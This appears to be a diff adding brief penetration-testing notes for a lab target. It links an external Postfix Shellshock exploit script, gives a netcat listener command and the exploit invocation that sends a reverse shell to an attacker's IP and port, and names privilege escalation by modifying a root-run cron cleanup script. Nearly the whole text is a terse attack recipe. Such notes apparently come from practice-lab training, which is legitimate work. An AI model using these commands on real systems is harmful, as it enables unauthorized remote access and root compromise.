@@ -1,0 +1,9 @@
+https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py
+
+nc -lnvp PORT
+
+python postfix-shellshock-nc.py 10.11.1.231 useradm@mail.local IP PORT
+
+privesc:
+
+modify cleanup.sh script that run in cron whit root privileges
